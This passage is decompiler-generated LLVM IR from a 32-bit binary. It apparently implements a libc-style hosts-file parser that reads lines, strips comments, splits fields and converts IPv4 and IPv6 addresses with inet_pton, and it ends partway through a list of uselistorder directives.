  %stack_var_-40.0 = phi i32 [ %v0_8053f2a, %dec_label_pc_8053f1f ], [ 0, %dec_label_pc_8053fce ]
  %stack_var_4.0 = phi i32 [ %v0_8053f12, %dec_label_pc_8053f1f ], [ %arg1, %dec_label_pc_8053fce ]
  %stack_var_-20.0 = phi i8* [ %v5_8053f36, %dec_label_pc_8053f1f ], [ %v5_8053ea8, %dec_label_pc_8053fce ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8053ff1.pre-phi, align 4
  %v4_8054109 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_80540a6 = inttoptr i32 %arg2 to i8*
  %v0_8054103120127 = load i32, i32* @edx, align 4
  %v3_805410d121128 = call i32 @fgets(i32 %v4_8054109, i32 %stack_var_4.0, i32 %v0_8054103120127)
  store i32 %v3_805410d121128, i32* @eax, align 4
  %v1_8054115122129 = icmp eq i32 %v3_805410d121128, 0
  %v1_8054117123130 = icmp eq i1 %v1_8054115122129, false
  br i1 %v1_8054117123130, label %dec_label_pc_8054004.lr.ph.lr.ph, label %dec_label_pc_805411d

dec_label_pc_8054004.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8053fed
  %v12_80540db = icmp eq i32 %arg3, 10
  %v12_80540b9 = icmp eq i32 %arg3, 2
  %v12_8054080 = icmp eq i32 %arg4, 2
  %v1_8054085 = icmp eq i1 %v12_8054080, false
  %v1_80540be = icmp eq i1 %v12_80540b9, false
  %v1_80540e0 = icmp eq i1 %v12_80540db, false
  br label %dec_label_pc_8054004.lr.ph

dec_label_pc_8054004.lr.ph:                       ; preds = %dec_label_pc_8054004.lr.ph.lr.ph, %dec_label_pc_8054103.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_8054004.lr.ph.lr.ph ], [ 2, %dec_label_pc_8054103.outer.backedge ]
  br label %dec_label_pc_8054004

dec_label_pc_8054004:                             ; preds = %dec_label_pc_8054004.lr.ph, %dec_label_pc_8054103.backedge
  %v3_805400c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_805400c, i32* @eax, align 4
  %v1_8054014 = icmp eq i32 %v3_805400c, 0
  br i1 %v1_8054014, label %dec_label_pc_805401b, label %dec_label_pc_8054018

dec_label_pc_8054018:                             ; preds = %dec_label_pc_8054004
  %v1_8054018 = inttoptr i32 %v3_805400c to i8*
  store i8 0, i8* %v1_8054018, align 1
  br label %dec_label_pc_805401b

dec_label_pc_805401b:                             ; preds = %dec_label_pc_8054004, %dec_label_pc_8054018
  store i32 %v4_8054109, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805405b32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805405b33 = icmp eq i8 %v2_805405b32, 0
  %v1_805405e39 = icmp eq i1 %v3_805405b33, false
  br i1 %v1_805405e39, label %dec_label_pc_8054027.preheader.preheader, label %dec_label_pc_8054060

dec_label_pc_8054027.preheader.preheader:         ; preds = %dec_label_pc_805401b
  %v4_805402797.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054027.preheader

dec_label_pc_8054023:                             ; preds = %dec_label_pc_805402d
  store i8 0, i8* %v1_8054027102, align 1
  %v0_8054026 = load i32, i32* @ecx, align 4
  %v1_8054026 = add i32 %v0_8054026, 1
  store i32 %v1_8054026, i32* @ecx, align 4
  %v1_8054027 = inttoptr i32 %v1_8054026 to i8*
  %v2_8054027 = load i8, i8* %v1_8054027, align 1
  %v3_8054027 = zext i8 %v2_8054027 to i32
  %v4_8054027 = load i32, i32* %eax.global-to-local, align 4
  %v5_8054027 = and i32 %v4_8054027, -256
  %v6_8054027 = or i32 %v5_8054027, %v3_8054027
  store i32 %v6_8054027, i32* @eax, align 4
  %v4_8054029 = icmp eq i8 %v2_8054027, 0
  br i1 %v4_8054029, label %dec_label_pc_8054027.dec_label_pc_8054060.loopexit_crit_edge, label %dec_label_pc_805402d

dec_label_pc_805402d:                             ; preds = %dec_label_pc_8054027.preheader, %dec_label_pc_8054023
  %v2_8054027103 = phi i8 [ %v2_8054027, %dec_label_pc_8054023 ], [ %v2_805402795, %dec_label_pc_8054027.preheader ]
  %v1_8054027102 = phi i8* [ %v1_8054027, %dec_label_pc_8054023 ], [ %v1_805402794, %dec_label_pc_8054027.preheader ]
  %v0_8054023101 = phi i32 [ %v1_8054026, %dec_label_pc_8054023 ], [ %v0_805402747, %dec_label_pc_8054027.preheader ]
  %v2_805402d = sext i8 %v2_8054027103 to i32
  store i32 %v2_805402d, i32* @edx, align 4
  %v0_8054030 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_8054030, i32* %eax.global-to-local, align 4
  %v2_8054035 = mul nsw i32 %v2_805402d, 2
  %v3_8054035 = add i32 %v0_8054030, %v2_8054035
  %v4_8054035 = inttoptr i32 %v3_8054035 to i8*
  %v5_8054035 = load i8, i8* %v4_8054035, align 1
  %v6_8054035 = and i8 %v5_8054035, 32
  %v7_8054035 = icmp eq i8 %v6_8054035, 0
  %v1_8054039 = icmp eq i1 %v7_8054035, false
  br i1 %v1_8054039, label %dec_label_pc_8054023, label %dec_label_pc_805403b

dec_label_pc_805403b:                             ; preds = %dec_label_pc_805402d
  %v0_805403b = load i32, i32* @edi, align 4
  %v1_805403b = add i32 %v0_805403b, -6
  %v6_805403b = sub i32 5, %v0_805403b
  %v7_805403b = and i32 %v6_805403b, %v0_805403b
  %v8_805403b = icmp slt i32 %v7_805403b, 0
  %v9_805403b = icmp eq i32 %v1_805403b, 0
  %v10_805403b = icmp slt i32 %v1_805403b, 0
  %v3_805403e = icmp eq i1 %v10_805403b, %v8_805403b
  %v4_805403e = icmp eq i1 %v9_805403b, false
  %v5_805403e = and i1 %v4_805403e, %v3_805403e
  br i1 %v5_805403e, label %dec_label_pc_8054047.preheader, label %dec_label_pc_8054040

dec_label_pc_8054040:                             ; preds = %dec_label_pc_805403b
  %v1_8054040 = load i32, i32* @ebx, align 4
  %v3_8054040 = mul i32 %v0_805403b, 4
  %v4_8054040 = add i32 %v1_8054040, %v3_8054040
  %v5_8054040 = inttoptr i32 %v4_8054040 to i32*
  store i32 %v0_8054023101, i32* %v5_8054040, align 4
  %v0_8054043 = load i32, i32* @edi, align 4
  %v1_8054043 = add i32 %v0_8054043, 1
  store i32 %v1_8054043, i32* @edi, align 4
  %v0_8054047.pre.pre = load i32, i32* @ecx, align 4
  %v4_8054047.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054047.preheader

dec_label_pc_8054047.preheader:                   ; preds = %dec_label_pc_8054040, %dec_label_pc_805403b
  %v4_8054047.pre = phi i32 [ %v4_8054047.pre.pre, %dec_label_pc_8054040 ], [ %v0_8054030, %dec_label_pc_805403b ]
  %v0_8054047.pre = phi i32 [ %v0_8054047.pre.pre, %dec_label_pc_8054040 ], [ %v0_8054023101, %dec_label_pc_805403b ]
  %v1_805406052 = phi i32 [ %v1_8054043, %dec_label_pc_8054040 ], [ %v0_805403b, %dec_label_pc_805403b ]
  %v1_8054047104 = inttoptr i32 %v0_8054047.pre to i8*
  %v2_8054047105 = load i8, i8* %v1_8054047104, align 1
  %v3_8054047106 = zext i8 %v2_8054047105 to i32
  %v5_8054047107 = and i32 %v4_8054047.pre, -256
  %v6_8054047108 = or i32 %v3_8054047106, %v5_8054047107
  store i32 %v6_8054047108, i32* @eax, align 4
  %v4_8054049109 = icmp eq i8 %v2_8054047105, 0
  br i1 %v4_8054049109, label %dec_label_pc_805405b.loopexit, label %dec_label_pc_805404d.lr.ph

dec_label_pc_805404d.lr.ph:                       ; preds = %dec_label_pc_8054047.preheader
  %v0_8054050.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_805404d

dec_label_pc_8054046:                             ; preds = %dec_label_pc_805404d
  %v1_8054046 = add i32 %v0_805405b110, 1
  store i32 %v1_8054046, i32* @ecx, align 4
  %v1_8054047 = inttoptr i32 %v1_8054046 to i8*
  %v2_8054047 = load i8, i8* %v1_8054047, align 1
  %v3_8054047 = zext i8 %v2_8054047 to i32
  %v5_8054047 = and i32 %v0_8054050.pre, -256
  %v6_8054047 = or i32 %v3_8054047, %v5_8054047
  store i32 %v6_8054047, i32* @eax, align 4
  %v4_8054049 = icmp eq i8 %v2_8054047, 0
  br i1 %v4_8054049, label %dec_label_pc_805405b.loopexit, label %dec_label_pc_805404d

dec_label_pc_805404d:                             ; preds = %dec_label_pc_805404d.lr.ph, %dec_label_pc_8054046
  %v2_8054047112 = phi i8 [ %v2_8054047105, %dec_label_pc_805404d.lr.ph ], [ %v2_8054047, %dec_label_pc_8054046 ]
  %v1_8054047111 = phi i8* [ %v1_8054047104, %dec_label_pc_805404d.lr.ph ], [ %v1_8054047, %dec_label_pc_8054046 ]
  %v0_805405b110 = phi i32 [ %v0_8054047.pre, %dec_label_pc_805404d.lr.ph ], [ %v1_8054046, %dec_label_pc_8054046 ]
  %v2_805404d = sext i8 %v2_8054047112 to i32
  store i32 %v2_805404d, i32* @edx, align 4
  store i32 %v0_8054050.pre, i32* @eax, align 4
  %v2_8054055 = mul nsw i32 %v2_805404d, 2
  %v3_8054055 = add i32 %v0_8054050.pre, %v2_8054055
  %v4_8054055 = inttoptr i32 %v3_8054055 to i8*
  %v5_8054055 = load i8, i8* %v4_8054055, align 1
  %v6_8054055 = and i8 %v5_8054055, 32
  %v7_8054055 = icmp eq i8 %v6_8054055, 0
  br i1 %v7_8054055, label %dec_label_pc_8054046, label %dec_label_pc_805405b.loopexit

dec_label_pc_805405b.loopexit:                    ; preds = %dec_label_pc_805404d, %dec_label_pc_8054046, %dec_label_pc_8054047.preheader
  %v4_805402797144 = phi i32 [ %v6_8054047108, %dec_label_pc_8054047.preheader ], [ %v6_8054047, %dec_label_pc_8054046 ], [ %v0_8054050.pre, %dec_label_pc_805404d ]
  %v0_805405b.lcssa = phi i32 [ %v0_8054047.pre, %dec_label_pc_8054047.preheader ], [ %v1_8054046, %dec_label_pc_8054046 ], [ %v0_805405b110, %dec_label_pc_805404d ]
  %v1_8054047.lcssa = phi i8* [ %v1_8054047104, %dec_label_pc_8054047.preheader ], [ %v1_8054047, %dec_label_pc_8054046 ], [ %v1_8054047111, %dec_label_pc_805404d ]
  %v2_805405b = load i8, i8* %v1_8054047.lcssa, align 1
  %v3_805405b = icmp eq i8 %v2_805405b, 0
  %v1_805405e = icmp eq i1 %v3_805405b, false
  br i1 %v1_805405e, label %dec_label_pc_8054027.preheader, label %dec_label_pc_8054060

dec_label_pc_8054027.preheader:                   ; preds = %dec_label_pc_8054027.preheader.preheader, %dec_label_pc_805405b.loopexit
  %v1_8054060.pre147 = phi i32 [ %v1_805406052, %dec_label_pc_805405b.loopexit ], [ 0, %dec_label_pc_8054027.preheader.preheader ]
  %v4_805402797 = phi i32 [ %v4_805402797144, %dec_label_pc_805405b.loopexit ], [ %v4_805402797.pre, %dec_label_pc_8054027.preheader.preheader ]
  %v0_805402747 = phi i32 [ %v0_805405b.lcssa, %dec_label_pc_805405b.loopexit ], [ %v4_8054109, %dec_label_pc_8054027.preheader.preheader ]
  %v1_805402794 = inttoptr i32 %v0_805402747 to i8*
  %v2_805402795 = load i8, i8* %v1_805402794, align 1
  %v3_805402796 = zext i8 %v2_805402795 to i32
  %v5_805402798 = and i32 %v4_805402797, -256
  %v6_805402799 = or i32 %v5_805402798, %v3_805402796
  store i32 %v6_805402799, i32* @eax, align 4
  %v4_8054029100 = icmp eq i8 %v2_805402795, 0
  br i1 %v4_8054029100, label %dec_label_pc_8054060, label %dec_label_pc_805402d

dec_label_pc_8054027.dec_label_pc_8054060.loopexit_crit_edge: ; preds = %dec_label_pc_8054023
  %v1_8054060.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054060

dec_label_pc_8054060:                             ; preds = %dec_label_pc_805405b.loopexit, %dec_label_pc_8054027.dec_label_pc_8054060.loopexit_crit_edge, %dec_label_pc_8054027.preheader, %dec_label_pc_805401b
  %v1_8054060 = phi i32 [ 0, %dec_label_pc_805401b ], [ %v1_8054060.pre.pre, %dec_label_pc_8054027.dec_label_pc_8054060.loopexit_crit_edge ], [ %v1_8054060.pre147, %dec_label_pc_8054027.preheader ], [ %v1_805406052, %dec_label_pc_805405b.loopexit ]
  %v0_8054060 = load i32, i32* @ebx, align 4
  %v2_8054060 = mul i32 %v1_8054060, 4
  %v3_8054060 = add i32 %v2_8054060, %v0_8054060
  %v4_8054060 = inttoptr i32 %v3_8054060 to i32*
  store i32 0, i32* %v4_8054060, align 4
  %v0_8054067 = load i32, i32* @edi, align 4
  %v7_805406a = icmp sgt i32 %v0_8054067, 1
  br i1 %v7_805406a, label %dec_label_pc_8054070, label %dec_label_pc_8054103.backedge

dec_label_pc_8054070:                             ; preds = %dec_label_pc_8054060
  br i1 %v12_8053eac, label %dec_label_pc_805413d, label %dec_label_pc_805407b

dec_label_pc_805407b:                             ; preds = %dec_label_pc_8054070
  store i32 1, i32* @esi, align 4
  br i1 %v1_8054085, label %dec_label_pc_805409d.lr.ph, label %dec_label_pc_8054087

dec_label_pc_805409d.lr.ph:                       ; preds = %dec_label_pc_805407b
  br label %dec_label_pc_805409d

dec_label_pc_8054087:                             ; preds = %dec_label_pc_805407b
  %v0_8054087 = load i32, i32* @eax, align 4
  %v0_8054089 = load i32, i32* @ebx, align 4
  %v1_8054089 = inttoptr i32 %v0_8054089 to i32*
  %v2_8054089 = load i32, i32* %v1_8054089, align 4
  %v5_805408f = call i32 @__GI_strcoll(i8* %v2_80540a6, i32 %v2_8054089, i32 %v0_8054087, i32 %v0_8054087)
  store i32 %v5_805408f, i32* %eax.global-to-local, align 4
  %v1_8054097 = icmp eq i32 %v5_805408f, 0
  %v1_8054099 = icmp eq i1 %v1_8054097, false
  br i1 %v1_8054099, label %dec_label_pc_8054103.backedge, label %dec_label_pc_80540b9

dec_label_pc_8054103.backedge:                    ; preds = %dec_label_pc_80540b2, %dec_label_pc_8054087, %dec_label_pc_8054060
  %v0_8054103 = load i32, i32* @edx, align 4
  %v3_805410d = call i32 @fgets(i32 %v4_8054109, i32 %stack_var_4.0, i32 %v0_8054103)
  store i32 %v3_805410d, i32* @eax, align 4
  %v1_8054115 = icmp eq i32 %v3_805410d, 0
  %v1_8054117 = icmp eq i1 %v1_8054115, false
  br i1 %v1_8054117, label %dec_label_pc_8054004, label %dec_label_pc_805411d

dec_label_pc_805409d:                             ; preds = %dec_label_pc_805409d.lr.ph, %dec_label_pc_80540b2
  %v1_805409f119 = phi i32 [ 1, %dec_label_pc_805409d.lr.ph ], [ %v1_80540b2, %dec_label_pc_80540b2 ]
  %v0_805409f = load i32, i32* @ebx, align 4
  %v2_805409f = mul i32 %v1_805409f119, 4
  %v3_805409f = add i32 %v0_805409f, %v2_805409f
  %v4_805409f = inttoptr i32 %v3_805409f to i32*
  %v5_805409f = load i32, i32* %v4_805409f, align 4
  %v3_80540a6 = call i32 @__GI_strcasecmp(i8* %v2_80540a6, i32 %v5_805409f)
  store i32 %v3_80540a6, i32* %eax.global-to-local, align 4
  %v1_80540ae = icmp eq i32 %v3_80540a6, 0
  br i1 %v1_80540ae, label %dec_label_pc_80540b9, label %dec_label_pc_80540b2

dec_label_pc_80540b2:                             ; preds = %dec_label_pc_805409d
  %v0_80540b2 = load i32, i32* @esi, align 4
  %v1_80540b2 = add i32 %v0_80540b2, 1
  store i32 %v1_80540b2, i32* @esi, align 4
  %v1_80540b3.pre = load i32, i32* @edi, align 4
  %v5_80540b5 = icmp slt i32 %v1_80540b2, %v1_80540b3.pre
  br i1 %v5_80540b5, label %dec_label_pc_805409d, label %dec_label_pc_8054103.backedge

dec_label_pc_80540b9:                             ; preds = %dec_label_pc_8054087, %dec_label_pc_805409d
  br i1 %v1_80540be, label %dec_label_pc_80540db, label %dec_label_pc_80540c0

dec_label_pc_80540c0:                             ; preds = %dec_label_pc_80540b9
  %v0_80540c0 = load i32, i32* @esi, align 4
  %v3_80540c1 = load i8*, i8** %stack_var_-44, align 4
  %v4_80540c1 = ptrtoint i8* %v3_80540c1 to i32
  %v0_80540c5 = load i32, i32* @ebx, align 4
  %v1_80540c5 = inttoptr i32 %v0_80540c5 to i32*
  %v2_80540c5 = load i32, i32* %v1_80540c5, align 4
  %v4_80540c9 = inttoptr i32 %v2_80540c5 to i8*
  %v5_80540c9 = call i32 @inet_pton(i32 2, i8* %v4_80540c9, i32 %v4_80540c1, i32 %v0_80540c0)
  store i32 %v5_80540c9, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_80540c9, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8053f59, label %dec_label_pc_8054103.outer.backedge

dec_label_pc_8054103.outer.backedge:              ; preds = %dec_label_pc_80540c0, %dec_label_pc_80540e2, %dec_label_pc_80540db
  %v0_8054103120 = load i32, i32* @edx, align 4
  %v3_805410d121 = call i32 @fgets(i32 %v4_8054109, i32 %stack_var_4.0, i32 %v0_8054103120)
  store i32 %v3_805410d121, i32* @eax, align 4
  %v1_8054115122 = icmp eq i32 %v3_805410d121, 0
  %v1_8054117123 = icmp eq i1 %v1_8054115122, false
  br i1 %v1_8054117123, label %dec_label_pc_8054004.lr.ph, label %dec_label_pc_805411d

dec_label_pc_80540db:                             ; preds = %dec_label_pc_80540b9
  br i1 %v1_80540e0, label %dec_label_pc_8054103.outer.backedge, label %dec_label_pc_80540e2

dec_label_pc_80540e2:                             ; preds = %dec_label_pc_80540db
  %v0_80540e2 = load i32, i32* @ecx, align 4
  %v0_80540e7 = load i32, i32* @ebx, align 4
  %v1_80540e7 = inttoptr i32 %v0_80540e7 to i32*
  %v2_80540e7 = load i32, i32* %v1_80540e7, align 4
  %v4_80540eb = inttoptr i32 %v2_80540e7 to i8*
  %v5_80540eb = call i32 @inet_pton(i32 10, i8* %v4_80540eb, i32 %stack_var_-36.0, i32 %v0_80540e2)
  store i32 %v5_80540eb, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_80540eb, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8053f86, label %dec_label_pc_8054103.outer.backedge

dec_label_pc_805411d:                             ; preds = %dec_label_pc_8054103.outer.backedge, %dec_label_pc_8053fed, %dec_label_pc_8054103.backedge, %dec_label_pc_8053fb2
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8053fb2 ], [ 1, %dec_label_pc_8053fed ], [ 2, %dec_label_pc_8054103.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8054103.backedge ]
  br i1 %v12_8053eac, label %dec_label_pc_805413d, label %dec_label_pc_8054124

dec_label_pc_8054124:                             ; preds = %dec_label_pc_805411d
  %v1_805412b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_805412b = call i32 @__GI_fclose(i16* %v1_805412b)
  store i32 %v2_805412b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805413d

dec_label_pc_805413d:                             ; preds = %dec_label_pc_8054070, %dec_label_pc_8053e8d, %dec_label_pc_8053e99, %dec_label_pc_8053eb7, %dec_label_pc_8053eca, %dec_label_pc_8053ed6, %dec_label_pc_8053edf, %dec_label_pc_8053f09, %dec_label_pc_805411d, %dec_label_pc_8054124, %dec_label_pc_8053f3f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_805411d ], [ %stack_var_-28.1, %dec_label_pc_8054124 ], [ %v2_8053f4e, %dec_label_pc_8053f3f ], [ 34, %dec_label_pc_8053f09 ], [ 34, %dec_label_pc_8053edf ], [ 34, %dec_label_pc_8053ed6 ], [ 34, %dec_label_pc_8053eca ], [ 34, %dec_label_pc_8053eb7 ], [ 34, %dec_label_pc_8053e99 ], [ 34, %dec_label_pc_8053e8d ], [ %stack_var_-28.0.ph131, %dec_label_pc_8054070 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8053e78, i32* @ebx, align 4
  store i32 %v0_8053e77, i32* @esi, align 4
  store i32 %v0_8053e76, i32* @edi, align 4
  store i32 %v0_8053e75, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_80540b2, { 0, 2, 1 }
  uselistorder i8 %v2_805402795, { 1, 2, 0 }
  uselistorder i8* %v1_805402794, { 1, 0 }
  uselistorder i32 %v0_805402747, { 1, 0 }
  uselistorder i32 %v2_805404d, { 1, 0 }
  uselistorder i32 %v1_8054046, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054050.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805403b, { 1, 0 }
  uselistorder i32 %v0_805403b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805402d, { 1, 0 }
  uselistorder i8* %v2_80540a6, { 1, 0 }
  uselistorder i32 %v4_8054109, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8053eca, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053ea5, { 1, 0 }
  uselistorder i32 %v1_8053e88, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 10, 0, 1, 16, 17, 15, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 14, 22, 23, 24, 0, 13, 8, 9, 17, 10, 25, 26, 1, 3, 21, 4, 5, 18, 6, 19, 7, 20, 11, 12, 15, 16, 2 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 14, 0, 1, 13, 2, 22, 15, 16, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_8058218, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 97, 0, 98, 21, 22, 99, 101, 3, 55, 54, 2, 102, 103, 6, 104, 4, 105, 5, 106, 126, 8, 57, 56, 7, 76, 77, 107, 78, 79, 80, 81, 82, 83, 135, 84, 42, 43, 44, 95, 136, 128, 129, 137, 120, 119, 9, 41, 100, 108, 85, 86, 87, 88, 89, 10, 90, 91, 11, 92, 93, 94, 109, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 47, 48, 49, 50, 51, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 18, 19, 20, 96, 17, 110, 111, 112, 113, 114, 115, 116, 117, 118, 121, 123, 122, 124, 125, 12, 127, 134, 131, 14, 132, 15, 133, 13, 130, 16 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 10, { 19, 2, 29, 30, 31, 32, 33, 34, 3, 23, 24, 26, 25, 4, 7, 35, 8, 28, 10, 9, 20, 5, 12, 22, 27, 11, 37, 21, 0, 18, 17, 16, 13, 14, 1, 36, 38, 39, 15, 6 }
  uselistorder i32 12, { 91, 92, 93, 0, 94, 18, 27, 95, 111, 22, 21, 4, 99, 5, 6, 7, 8, 9, 10, 11, 96, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 144, 26, 28, 90, 110, 29, 30, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 31, 32, 33, 34, 35, 36, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 23, 143, 100, 101, 102, 103, 145, 85, 1, 2, 86, 87, 12, 13, 88, 3, 97, 98, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 24, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 19, 70, 71, 72, 73, 25, 20, 89, 17, 16, 15, 14, 104, 105, 106, 107, 108, 109 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 5, 4, 10, 11, 12, 13, 14, 1, 7, 2, 8, 3, 0, 15, 9, 6 }
  uselistorder i32 44, { 7, 8, 9, 4, 5, 6, 20, 11, 12, 3, 17, 19, 18, 14, 15, 16, 13, 10, 0, 1, 2 }
  uselistorder i32 36, { 10, 11, 12, 14, 15, 16, 17, 18, 19, 1, 20, 2, 3, 21, 13, 5, 6, 7, 8, 9, 4, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 18, 13, 3, 9, 4, 19, 20, 0, 10, 6, 5, 1, 12, 7, 8, 14, 15, 16, 17, 2, 11 }
  uselistorder i32 -48, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 16, { 103, 102, 10, 104, 105, 29, 4, 106, 30, 107, 74, 75, 115, 116, 117, 118, 119, 120, 127, 121, 122, 123, 124, 125, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 108, 109, 110, 111, 76, 77, 78, 79, 80, 81, 82, 83, 153, 31, 32, 44, 33, 61, 40, 47, 99, 48, 157, 11, 49, 50, 51, 0, 12, 146, 14, 13, 147, 1, 15, 138, 139, 37, 158, 112, 113, 84, 85, 86, 87, 88, 89, 2, 90, 91, 92, 93, 94, 16, 95, 96, 41, 97, 154, 155, 156, 114, 5, 3, 52, 53, 54, 55, 57, 56, 58, 59, 60, 43, 34, 62, 63, 64, 65, 66, 42, 67, 68, 7, 8, 69, 70, 71, 72, 73, 35, 36, 98, 26, 27, 28, 24, 25, 22, 23, 17, 18, 19, 20, 21, 45, 46, 100, 101, 9, 38, 140, 141, 142, 143, 144, 39, 145, 6, 148, 149, 150, 151, 152 }
  uselistorder i32 8, { 133, 132, 134, 14, 15, 135, 136, 137, 138, 139, 140, 1, 141, 16, 10, 142, 143, 144, 47, 102, 50, 23, 24, 25, 26, 51, 27, 28, 29, 52, 30, 53, 31, 54, 55, 146, 103, 104, 105, 106, 107, 108, 48, 109, 110, 111, 207, 208, 44, 214, 45, 215, 65, 46, 66, 32, 68, 131, 159, 69, 70, 161, 162, 163, 164, 165, 166, 167, 2, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 3, 71, 72, 73, 74, 75, 76, 77, 78, 178, 179, 180, 181, 182, 57, 4, 58, 5, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 56, 200, 201, 6, 202, 203, 204, 205, 7, 206, 153, 154, 17, 213, 147, 148, 18, 19, 67, 112, 113, 114, 115, 117, 118, 119, 116, 120, 121, 122, 123, 33, 34, 124, 125, 126, 127, 128, 129, 20, 209, 210, 211, 149, 150, 151, 152, 145, 212, 79, 80, 81, 82, 22, 59, 60, 83, 0, 61, 84, 85, 86, 87, 88, 21, 89, 90, 91, 49, 92, 64, 93, 94, 95, 96, 97, 98, 99, 11, 100, 12, 62, 35, 63, 101, 130, 43, 42, 41, 39, 40, 36, 37, 38, 13, 155, 156, 157, 158, 160, 9, 8 }
  uselistorder i32 -32, { 15, 0, 1, 2, 13, 14, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 32, { 76, 27, 77, 78, 26, 31, 83, 46, 84, 85, 86, 44, 45, 64, 24, 94, 32, 53, 55, 56, 59, 25, 57, 58, 1, 0, 2, 3, 47, 4, 54, 5, 6, 7, 8, 9, 10, 28, 81, 79, 80, 65, 66, 29, 67, 68, 69, 70, 71, 72, 73, 11, 74, 75, 48, 92, 93, 82, 91, 60, 61, 62, 63, 35, 12, 49, 50, 13, 51, 30, 15, 14, 37, 36, 33, 38, 16, 17, 19, 18, 39, 21, 20, 40, 42, 23, 22, 41, 87, 88, 89, 90, 43, 34, 52 }
  uselistorder i32 4, { 256, 257, 258, 252, 250, 251, 253, 254, 255, 35, 2, 259, 260, 261, 262, 263, 264, 265, 266, 267, 42, 146, 147, 148, 43, 44, 45, 268, 75, 36, 196, 3, 4, 197, 198, 199, 200, 201, 202, 5, 269, 272, 273, 274, 275, 276, 277, 90, 278, 285, 286, 287, 96, 46, 288, 289, 290, 291, 47, 48, 49, 97, 50, 51, 52, 53, 292, 54, 293, 98, 55, 99, 100, 6, 279, 280, 281, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 82, 213, 365, 214, 366, 367, 373, 374, 0, 379, 380, 381, 368, 76, 122, 162, 163, 369, 370, 371, 372, 7, 149, 150, 151, 152, 153, 101, 237, 238, 239, 91, 304, 305, 306, 307, 154, 155, 156, 157, 158, 92, 8, 159, 160, 375, 377, 318, 319, 320, 321, 322, 323, 9, 324, 325, 326, 327, 328, 329, 330, 331, 316, 317, 164, 83, 165, 166, 167, 168, 169, 170, 171, 10, 173, 172, 332, 81, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 32, 353, 354, 356, 355, 11, 161, 376, 174, 175, 294, 295, 77, 296, 297, 298, 299, 37, 12, 38, 378, 13, 176, 215, 14, 216, 217, 218, 219, 220, 221, 